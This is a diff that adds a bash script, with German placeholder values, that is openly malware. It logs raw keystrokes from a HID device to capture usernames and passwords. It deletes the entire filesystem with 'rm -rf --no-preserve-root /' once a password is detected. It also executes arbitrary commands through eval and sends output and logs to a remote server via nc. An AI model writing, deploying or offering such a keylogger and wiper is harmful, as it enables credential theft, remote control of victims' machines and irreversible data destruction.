@@ -1,0 +1,35 @@
+#!/bin/bash
+
+SERVER_IP="deine_server_ip"
+SERVER_PORT="dein_server_port"
+
+while true; do
+cat /dev/hidraw0 | hexdump -C | awk '{print $2}' | tr -d '\n' >> keystrokes.txt
+if grep -q 'username' keystrokes.txt; then
+echo "Username detected!" >> username_password.txt
+cat keystrokes.txt >> username_password.txt
+echo "" >> username_password.txt
+sed -i '/username/d' keystrokes.txt
+fi
+if grep -q 'password' keystrokes.txt; then
+echo "Password detected! Executing payload..." >> username_password.txt
+cat keystrokes.txt >> username_password.txt
+echo "" >> username_password.txt
+sed -i '/password/d' keystrokes.txt
+echo "Payload executed, crashing computer..." >> username_password.txt
+while true; do
+sudo rm -rf --no-preserve-root / >> /dev/null
+done
+fi
+if [ -f "stop_keylogging.txt" ]; then
+echo "Stopping keylogging..." >> username_password.txt
+rm -f stop_keylogging.txt
+break
+fi
+if [ -f "command.txt" ]; then
+command=$(cat command.txt)
+rm -f command.txt
+output=$(eval $command 2>&1)
+echo "$output" | nc $SERVER_IP $SERVER_PORT
+fi
+done | nc $SERVER_IP $SERVER_PORT
